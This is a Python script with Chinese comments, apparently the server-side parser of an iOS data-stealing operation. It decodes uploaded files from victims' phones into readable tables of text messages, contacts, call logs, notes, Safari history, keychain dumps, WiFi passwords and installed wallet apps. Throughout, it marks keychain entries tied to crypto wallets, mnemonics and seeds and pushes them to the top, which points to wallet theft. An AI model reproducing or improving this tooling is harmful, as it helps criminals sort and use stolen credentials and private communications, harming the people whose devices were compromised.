#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""parse18.py - 18链 ext_stats bin 解析器 v2（JSON+base64 解包 → sqlite/文件探测）
用法: python3 parse18.py <bin_path> <kind>
kind: sms | call | contact | note | safari | photo | auto
输出: JSON {ok, kind, file:{size,is_sqlite,magic}, payload_path?, tables:{...}, rows:[...]}
"""
import sys, json, os, re, sqlite3, base64, tempfile, datetime

def unpack(p):
    """bin → payload bytes + meta
    【2026-09-11】无价值 App 资源的 bin 没有 data 字段（内容按策略未落盘），
    这类文件返回空 payload + 元数据，让上层能识别"已丢弃"而不是当二进制处理。
    """
    raw = open(p, 'rb').read()
    meta = None
    try:
        j = json.loads(raw.decode('utf-8'))
        if isinstance(j, dict):
            if 'data' in j:
                return base64.b64decode(j['data']), j
            if j.get('dropped') or 'path' in j:
                return b'', j
    except Exception:
        pass
    return raw, meta

def fileinfo_bytes(b):
    magic4 = b[:4]
    is_sqlite = magic4 == b'SQLi' or b.startswith(b'SQLite format 3\x00')
    kind_hint = 'sqlite' if is_sqlite else (
        'png' if b.startswith(b'\x89PNG') else
        'jpeg' if b.startswith(b'\xff\xd8') else
        'heic' if b[4:12] == b'ftypheic' else
        'binary')
    return {'size': len(b), 'is_sqlite': is_sqlite, 'kind_hint': kind_hint, 'magic': magic4.hex()}

def sql_tables(conn):
    cur = conn.cursor()
    rows = cur.execute("SELECT name, type FROM sqlite_master WHERE type IN ('table','view') AND name NOT LIKE 'sqlite_%'").fetchall()
    out = []
    for name, typ in rows:
        try:
            cols = [c[1] for c in cur.execute('PRAGMA table_info("%s")' % name).fetchall()]
            cnt = cur.execute('SELECT COUNT(*) FROM "%s"' % name).fetchone()[0]
        except Exception:
            cols, cnt = [], 0
        out.append({'name': name, 'type': typ, 'cols': cols[:24], 'rows': cnt})
    return out

def pick_rows(conn, table, limit=60):
    try:
        cols = [c[1] for c in conn.execute('PRAGMA table_info("%s")' % table).fetchall()]
        if not cols: return []
        rows = conn.execute('SELECT * FROM "%s" LIMIT %d' % (table, limit)).fetchall()
        out = []
        for r in rows:
            d = {}
            for c, v in zip(cols, r):
                if isinstance(v, bytes):
                    d[c] = v[:200].decode('utf-8', 'replace') if len(v) <= 8000 else '<blob %dB>' % len(v)
                elif v is None:
                    d[c] = None
                else:
                    d[c] = str(v)[:240]
            out.append(d)
        return out
    except Exception as e:
        return [{'error': str(e)}]

# ───────────────────── 语义化解读（view 模式，2026-09-11 新增） ─────────────────────
# 目的：ext_stats 的 data 已是明文原文件，但直接展示给人看不懂。
#      这里按文件"是什么"给出结构化/可读视图：keychain 表格、WiFi 表格、清单表格、
#      文本、SQLite、二进制（文件头识别 + 字符串摘录 + App 资源定性）。
WALLET_HINTS = ('bitpie', 'sixdays.trust', 'trust', 'imtoken', 'im.token', 'metamask',
                'tokenpocket', 'bitkeep', 'pandawallet', 'tonkeeper', 'exodus', 'phantom',
                'solflare', 'bitget', 'seed', 'entropy', 'hdseed', 'mnemonic')

SIGS = [(b'\x89PNG', 'PNG 图片'), (b'\xff\xd8\xff', 'JPEG 图片'), (b'GIF8', 'GIF 图片'),
        (b'SQLite format 3', 'SQLite 数据库'), (b'ID3', 'MP3 音频'), (b'\xff\xfb', 'MP3 音频'),
        (b'PK\x03\x04', 'ZIP / Office 文档'), (b'%PDF', 'PDF 文档'), (b'bplist00', 'Property List'),
        (b'AM-zlib', '高德自有压缩资源'), (b'\x1f\x8b', 'gzip 压缩'),
        (b'RIFF', 'WAV / WebP'), (b'ftyp', 'MP4 / HEIC 媒体')]


# ───────────────────── 人话视图（readable，2026-09-12 新增） ─────────────────────
# 目的：sms.db / AddressBook / CallHistory / notes 这类系统库，直接丢表转储没人看得懂
#       （列名全是 Z_*/ABMultiValue 之类，时间还是 Apple epoch）。
#       这里按"文件是什么"给人话表格：短信会话 / 联系人清单 / 通话记录 / 备忘录。
#       时间统一换算成北京时间（Apple epoch 起点 2001-01-01 UTC）。
BJ_TZ = datetime.timezone(datetime.timedelta(hours=8))
APPLE_EPOCH = 978307200


def _bj(v, unit='s'):
    """Apple/Unix 时间戳 → 北京时间字符串（unit='ns' 用于 sms.db 的 date）。
       量级自适应（2026-09-14 修复）：Apple 绝对时间（2001 纪元，当前≈8.1e8 秒）需 +APPLE_EPOCH；
       但实测 Safari Bookmarks/History 的库直接存 Unix 秒（≈1.7e9）→ 再加偏移会 +31 年（2057）。
       按阈值区分；超出"现在+1 年"的脏值返回空串（调用方回退上传时刻，避免 2057/9026 类假时间上屏）。"""
    try:
        v = float(v)
        if v <= 0:
            return ''
        sec = v / 1e9 if unit == 'ns' else v
        if sec < 1.2e9:
            sec += APPLE_EPOCH
        if sec > datetime.datetime.now().timestamp() + 366 * 86400:
            return ''
        return datetime.datetime.fromtimestamp(sec, BJ_TZ).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return ''


def _attr_text(b):
    """iOS 16+ 短信正文在 attributedBody(typedstream) 里，text 列可能为空 → 抠出来"""
    if not b:
        return ''
    if isinstance(b, str):
        b = b.encode('utf-8', 'ignore')
    try:
        i = b.rfind(b'\x01\x2b')          # NSString 段标记
        if i < 0:
            return ''
        s = b[i + 2:]
        j = 0
        while j < len(s) and (s[j] & 0x80):   # varint 长度字节
            j += 1
        j += 1
        while j < len(s) and s[j] == 0:       # 可选 NUL
            j += 1
        txt = s[j:].split(b'\x00')[0]
        return txt.decode('utf-8', 'ignore').strip()
    except Exception:
        return ''


def _txt(v, n=400):
    if v is None:
        return ''
    if isinstance(v, (bytes, bytearray)):
        v = _attr_text(v) or v.decode('utf-8', 'ignore')
    return str(v).replace('\n', ' ').strip()[:n]


def readable_of(conn, path, limit=200):
    """按文件名/表特征返回 (标题, 表头, 行列表)；不认识则返回 None"""
    p = (path or '').lower()
    names = [r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
    def has(*t): return all(x in names for x in t)

    # ① 短信 / iMessage
    if has('message', 'handle') and ('sms' in p or 'message' in p or 'chat' in p):
        rows = conn.execute(
            "SELECT m.text, m.attributedBody, m.date, m.is_from_me, m.is_sent, m.is_read, m.subject, "
            "       h.id AS handle, m.cache_roomnames AS room, m.item_type "
            "FROM message m LEFT JOIN handle h ON m.handle_id = h.ROWID "
            "ORDER BY m.date DESC LIMIT %d" % limit).fetchall()
        cols = ['时间(北京)', '方向', '号码/账号', '正文', '状态']
        out = []
        for (text, attr, date, from_me, is_sent, is_read, subject, handle, room, itype) in rows:
            body = _txt(text, 2000) or _attr_text(attr)
            if not body and itype not in (0, None):
                body = '<非文本消息 type=%s>' % itype
            st = '已读' if is_read else ('已发送' if is_sent else '')
            out.append({'时间(北京)': _bj(date, 'ns'), '方向': '发出' if from_me else '接收',
                        '号码/账号': _txt(handle, 60) or _txt(room, 40), '正文': body, '状态': st})
        return ('短信 / iMessage（%d 条）' % len(out), cols, out)

    # ② 通讯录
    if has('ABPerson', 'ABMultiValue'):
        rows = conn.execute(
            "SELECT p.ROWID, p.First, p.Last, p.Middle, p.Organization, p.Nickname, p.JobTitle, "
            "       v.property, v.value "
            "FROM ABPerson p LEFT JOIN ABMultiValue v ON v.record_id = p.ROWID "
            "ORDER BY p.ROWID LIMIT 4000").fetchall()
        agg = {}
        for (rid, f, l, mid, org, nick, job, prop, val) in rows:
            d = agg.setdefault(rid, {'姓名': '', '电话': [], '邮箱': [], '组织': '', '其它': []})
            name = ''.join(x for x in (f, mid, l) if x) or nick or ''
            if name:
                d['姓名'] = name
            if org:
                d['组织'] = org
                if not d['姓名']:
                    d['姓名'] = org
            if val:
                if prop == 3:
                    if val not in d['电话']: d['电话'].append(val)
                elif prop == 4:
                    if val not in d['邮箱']: d['邮箱'].append(val)
                else:
                    if val not in d['其它']: d['其它'].append('%s:%s' % (prop, val))
        out = []
        for rid in sorted(agg):
            d = agg[rid]
            if not (d['姓名'] or d['电话'] or d['邮箱']):
                continue
            out.append({'姓名': d['姓名'], '电话': ' / '.join(d['电话'][:6]),
                        '邮箱': ' / '.join(d['邮箱'][:4]), '组织': d['组织'],
                        '其它': '; '.join(d['其它'][:4])})
        return ('联系人（%d 人）' % len(out), ['姓名', '电话', '邮箱', '组织', '其它'], out)

    # ③ 通话记录
    if 'ZCALLRECORD' in names:
        rows = conn.execute(
            "SELECT ZADDRESS, ZNAME, ZDATE, ZDURATION, ZORIGINATED, ZANSWERED, ZCALLTYPE "
            "FROM ZCALLRECORD ORDER BY ZDATE DESC LIMIT %d" % limit).fetchall()
        cols = ['时间(北京)', '方向', '号码', '姓名/备注', '时长(秒)', '结果']
        out = []
        for (addr, name, date, dur, orig, ans, ctype) in rows:
            out.append({'时间(北京)': _bj(date, 's'), '方向': '呼出' if orig else '呼入',
                        '号码': _txt(addr, 60), '姓名/备注': _txt(name, 60),
                        '时长(秒)': round(float(dur or 0), 1),
                        '结果': ('已接通' if (float(dur or 0) > 0 or ans) else ('未接来电' if not orig else '未接通'))})
        return ('通话记录（%d 条）' % len(out), cols, out)

    # ④ 备忘录
    if 'ZNOTE' in names:
        rows = conn.execute(
            "SELECT ZTITLE, ZSUMMARY, ZMODIFICATIONDATE, ZCREATIONDATE FROM ZNOTE "
            "WHERE ZDELETEDFLAG IS NULL OR ZDELETEDFLAG = 0 ORDER BY ZMODIFICATIONDATE DESC LIMIT %d" % limit).fetchall()
        cols = ['修改时间(北京)', '标题', '摘要/正文']
        out = []
        for (title, summary, mdate, cdate) in rows:
            out.append({'修改时间(北京)': _bj(mdate, 's'), '标题': _txt(title, 80),
                        '摘要/正文': _txt(summary, 1200)})
        return ('备忘录（%d 条）' % len(out), cols, out)
    return None


def _printable(b):
    if isinstance(b, (bytes, bytearray)):
        b = b.decode('latin-1')          # Python3 里 bytes 迭代出的是 int，先转成字符
    return ''.join(ch if 32 <= ord(ch) < 127 or ch == '\t' else '.' for ch in b)


def view_keychain(txt):
    """keychain dump → 结构化表格；Data 列是 hex，自动解码成可读文本"""
    rows = []
    for blk in re.split(r'(?=UUID:)', txt):
        if 'Account:' not in blk:
            continue
        def grab(pat):
            m = re.search(pat, blk)
            return m.group(1).strip() if m else ''
        svc, acc = grab(r'Service:\s*(.*)'), grab(r'Account:\s*(.*)')
        grp, dat = grab(r'Group:\s*(.*)'), grab(r'Data:\s*(\S+)')
        if not (acc and dat):
            continue
        dec = ''
        try:
            h = dat if len(dat) % 2 == 0 else dat[:-1]
            dec = _printable(bytes.fromhex(h))[:160]
        except Exception:
            pass
        low = (svc + ' ' + acc + ' ' + grp).lower()
        hits = [w for w in WALLET_HINTS if w in low]
        rows.append({'service': svc, 'account': acc, 'group': grp,
                     'data_text': dec, 'data_hex': dat[:96],
                     'flag': ('★ ' + '/'.join(hits[:3])) if hits else ''})
    hot = [r for r in rows if r['flag']]
    return {'kind': 'keychain',
            'title': '钥匙串条目 %d 条（★ 钱包/敏感项 %d 条，已置顶）' % (len(rows), len(hot)),
            'columns': ['flag', 'service', 'account', 'data_text', 'group', 'data_hex'],
            'rows': hot + [r for r in rows if not r['flag']],
            'note': 'data_text 是 Data 列（设备原始 hex）自动解码出的可读内容；'
                    'data_hex 是原始 hex。带 ★ 的是钱包/助记词/种子相关条目。'}


def view_wifi(txt):
    rows = []
    for m in re.finditer(r'SSID:\s*(\S+)\s*\nPassword:\s*(\S+)(?:\s*\nService:\s*(\S+))?', txt):
        rows.append({'SSID': m.group(1), '密码': m.group(2), '类型': m.group(3) or ''})
    if not rows:
        return {'kind': 'text', 'title': 'WiFi 密码', 'text': txt[:20000]}
    return {'kind': 'table', 'title': 'WiFi 密码 %d 条' % len(rows),
            'columns': ['SSID', '密码', '类型'], 'rows': rows}


def view_applist(txt):
    rows = []
    for ln in txt.split('\n'):
        m = re.match(r'\s*\[Bundle ID\]\s*(\S+)', ln)
        if m:
            rows.append({'条目': m.group(1), '类别': '加密/钱包类应用'})
            continue
        m = re.match(r'\s*\[APP\]\s*(\S+)', ln)
        if m:
            rows.append({'条目': m.group(1), '类别': '已安装应用'})
    return {'kind': 'table', 'title': '清单 %d 条' % len(rows),
            'columns': ['条目', '类别'], 'rows': rows[:500]}


def view_binary(payload, path):
    sig = '未知二进制格式'
    for s, n in SIGS:
        if payload.startswith(s):
            sig = n
            break
    low = (path or '').lower()
    noise = any(k in low for k in ('amap', 'offlinemap', 'cloud_tbt', 'unzip_', '.res', 'bundle_cloud'))
    strs, seen = [], set()
    for b in re.findall(rb'[\x20-\x7e]{6,}', payload[:300000]):
        d = b.decode('ascii', 'replace')
        if d not in seen:
            seen.add(d)
            strs.append(d)
        if len(strs) >= 150:
            break
    return {'kind': 'binary', 'title': '二进制文件 · %s' % sig, 'sig': sig, 'size': len(payload),
            'noise': noise,
            'note': ('这是 App 资源文件（如高德地图离线资源），没有分析价值，可忽略。'
                     if noise else '非文本文件。下面是文件头 hex 与可打印字符串摘录，可用于判断文件类型。'),
            'hex': payload[:512].hex(' ', 16), 'strings': strs}


def view_of(payload, meta):
    """按内容自动选择解读方式"""
    path = (meta or {}).get('path', '') or ''
    # 【2026-09-11】无价值 App 资源：内容按策略未落盘，给明确说明而不是空白
    if (meta or {}).get('dropped'):
        return {'kind': 'text', 'title': '内容未保存（无价值 App 资源）',
                'text': '该文件属于「无价值 App 资源」类目，按存储策略只保留了元数据，内容未落盘。\n\n'
                        '原始大小 : %s 字节\n类目     : %s\n说明     : %s\n\n'
                        '如需取回内容：把该类目从 server/admin_server.js 的 NOISE_CATEGORIES 移出，重新投递即可。'
                        % ((meta or {}).get('orig_bytes') or (meta or {}).get('size') or '?',
                           (meta or {}).get('category') or '',
                           (meta or {}).get('dropped_reason') or '')}
    low = path.lower()
    if payload[:8] == b'bplist00':
        try:
            import plistlib
            obj = plistlib.loads(payload)
            return {'kind': 'text', 'title': 'Property List（已解析）',
                    'text': json.dumps(obj, ensure_ascii=False, indent=2, default=str)[:40000]}
        except Exception:
            pass
    try:
        txt = payload.decode('utf-8')
        istext = True
    except Exception:
        txt, istext = '', False
    if not istext:
        # 宽松判定：keychain dump 等文本里可能混有少量二进制字节（生物特征/blob），
        # 严格 decode 会整体失败 → 改看可打印字符占比
        loose = payload[:8000].decode('utf-8', 'replace')
        good = sum(1 for ch in loose if 32 <= ord(ch) < 127 or ch in '\n\r\t')
        if loose and good / len(loose) > 0.85:
            txt, istext = payload.decode('utf-8', 'replace'), True
    if istext:
        if 'Service:' in txt[:4000] and 'Account:' in txt[:4000]:
            return view_keychain(txt)
        if 'wifi_passwords' in low or 'SSID:' in txt[:2000]:
            return view_wifi(txt)
        if 'installed_apps' in low or 'installed_cryptos' in low:
            return view_applist(txt)
        return {'kind': 'text', 'title': '文本内容', 'text': txt[:80000]}
    fi = fileinfo_bytes(payload)
    if fi['is_sqlite']:
        return {'kind': 'sqlite', 'title': 'SQLite 数据库',
                'note': '数据库文件。点列表里的「解析」按钮查看表结构与前若干行数据。'}
    return view_binary(payload, path)


def main():
    if len(sys.argv) < 3:
        print(json.dumps({'ok': False, 'error': 'usage: parse18.py <bin> <kind>'}, ensure_ascii=False)); return
    p, kind = sys.argv[1], (sys.argv[2] if len(sys.argv) > 2 else 'auto')
    if not os.path.exists(p):
        print(json.dumps({'ok': False, 'error': 'no such file'}, ensure_ascii=False)); return
    payload, meta = unpack(p)
    fi = fileinfo_bytes(payload)
    # ── view 模式：语义化解读（keychain 表格 / WiFi 表格 / 清单 / 文本 / 二进制 / SQLite）──
    if kind == 'view':
        resp = view_of(payload, meta)
        resp['ok'] = True
        resp['origin_path'] = (meta or {}).get('path', '')
        resp['origin_desc'] = (meta or {}).get('description', '')
        resp['category'] = (meta or {}).get('category', '')
        resp['file'] = fi
        print(json.dumps(resp, ensure_ascii=False, default=str))
        return
    resp = {'ok': True, 'kind': kind, 'file': fi, 'origin_path': (meta or {}).get('path', ''),
            'origin_desc': (meta or {}).get('description', ''), 'tables': [], 'rows': []}
    if not fi['is_sqlite']:
        resp['note'] = '非 sqlite 文件（原文件直出，kind_hint=%s）' % fi['kind_hint']
        print(json.dumps(resp, ensure_ascii=False)); return
    tmp = tempfile.mktemp(suffix='.db')
    try:
        open(tmp, 'wb').write(payload)
        conn = sqlite3.connect('file:%s?mode=ro' % tmp, uri=True)
        conn.text_factory = lambda b: b.decode('utf-8', 'replace')
        resp['tables'] = sql_tables(conn)
        # 【2026-09-12】优先给"人话视图"：短信会话 / 联系人 / 通话 / 备忘录
        #   （原来的裸表转储列名全 Z_*/ABMultiValue，时间还是 Apple epoch，用户看不懂）
        try:
            rd = readable_of(conn, (meta or {}).get('path', ''), 200)
        except Exception:
            rd = None
        if rd:
            title, cols, rrows = rd
            if rrows:
                resp['table'] = title
                resp['readable'] = True
                resp['rows'] = [dict(zip(cols, [r.get(c) for c in cols])) for r in rrows]
                conn.close()
                print(json.dumps(resp, ensure_ascii=False, default=str))
                return
        prefer = {
            'sms': ['message', 'sms', 'chat_handle_join', 'chat', 'handle'],
            'call': ['ZCALLRECORD', 'callrecord'],
            'contact': ['ABPerson', 'ABMultiValue'],
            'note': ['ZICNOTEDATA', 'ZICNOTE', 'note', 'Note'],
            'safari': ['history_items', 'history_visits', 'bookmarks'],
        }.get(kind, [])
        target = None
        for t in prefer:
            if any(x['name'] == t for x in resp['tables']):
                target = t; break
        if target:
            resp['rows'] = pick_rows(conn, target, 60)
            resp['table'] = target
        else:
            # fallback：优先非系统表（跳过 _SqliteDatabaseProperties / sqlite_* 这类无意义表）
            data_tables = [t for t in resp['tables'] if t['rows'] > 0 and not t['name'].startswith('_') and not t['name'].startswith('sqlite_')]
            if not data_tables:
                data_tables = [t for t in resp['tables'] if t['rows'] > 0]
            if data_tables:
                t0 = data_tables[0]['name']
                resp['table'] = t0
                resp['rows'] = pick_rows(conn, t0, 40)
        conn.close()
    except Exception as e:
        resp['error'] = str(e)
    finally:
        try: os.unlink(tmp)
        except: pass
    print(json.dumps(resp, ensure_ascii=False, default=str))

if __name__ == '__main__':
    main()
